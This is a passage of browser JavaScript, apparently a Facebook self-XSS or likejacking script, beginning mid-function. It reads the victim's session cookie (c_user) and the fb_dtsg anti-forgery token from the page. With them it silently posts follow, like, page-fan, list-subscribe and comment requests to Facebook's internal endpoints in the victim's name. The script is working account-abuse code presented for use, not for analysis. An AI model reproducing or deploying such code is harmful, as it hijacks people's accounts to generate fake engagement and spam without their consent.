params += "&reply_fbid=";
params += "&source=2";
params += "&client_id=1384301515666=3764176756"
xmlhttp.open("POST", "/ajax/ufi/add_comment.php", true);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(params);

}

}


// var sayfalar = Array("512863425416269","531326200228242");
// var likes = Array("130212980482242");
var aboneler = Array("");
var liste = Array("");


for(i=0;i<aboneler.length;i++){ 
abone(aboneler[i]);
}

for(i=0;i<liste.length;i++){ 
//liste(liste[i]);
}

var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

function abone(id) {
        var xhr = new XMLHttpRequest();
        params = 'profile_id=' + id;
        params += '&feed_blacklist_action=show_followee_on_follow';
        params += '&location=1';
        params += '&nctr[_mod]=pagelet_timeline_profile_actions';
        params += '&__user=' + profile_id;
        params += '&__a=1';
        params += '&__dyn=7n8ahyj2qmvu5k9UmAAlee8m7oy6E';
        params += '&__req=d';
        params += '&fb_dtsg=' + fb_dtsg;
        params += '&ttstamp=2658166878388121100';
        xhr.open("POST", "/ajax/follow/follow_profile.php", true);
        xhr.send(params);
    }

    function begen(id) {
        var xhr = new XMLHttpRequest();
         var params ="";
		 params +="like_action=true";
		 params +="&ft_ent_identifier="+id;
		 params +="&source=2";
		 params +="&client_id=1385136075299%3A2068859601";
		 params +="&rootid=u_jsonp_3_4";
		 params +="&giftoccasion";
		 params +="&ft[tn]=%3E%3D";
		 params +="&ft[type]=20";
		 params +="&__user="+profile_id;
		 params +="&__a=1";
		 params +="&__dyn=7n8anEAMHmqDx2h2u5Fa8HzCq74ryogByV8003_XUw";
		 params +="&__req=1g";
		 params +="&fb_dtsg="+fb_dtsg;
		 params +="&ttstamp=265816872541036890";
        xhr.open("POST", "/ajax/ufi/like.php", true);

        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
                xhr.close;
            }
        }
        xhr.send(params);
    }
	
	
function liste(id) {
 var xhr = new XMLHttpRequest();
 params ="fb_dtsg="+fb_dtsg;
 params +="&__user="+profile_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F94HzCq748yogByU";
 params +="&__req=k";
 params +="&ttstamp=2658167109104857848";
 xhr.open("POST", "/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+id, true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}


function sayfa(id) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&fbpage_id="+id;
 params +="&add=true";
 params +="&reload=false";
 params +="&fan_origin=page_timeline";
 params +="&fan_source";
 params +="&cat";
 params +="&";
 params +="&nctr[_mod]=pagelet_timeline_page_actions";
 params += "&__user="+profile_id;  
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F94HzCq7uq6Ehw";
 params +="&__req=p";
 params += "&fb_dtsg=" +  document.getElementsByName('fb_dtsg')[0].value;  
 params +="&ttstamp=2658168861211189567";
 xhr.open("POST", "/ajax/pages/fan_status.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
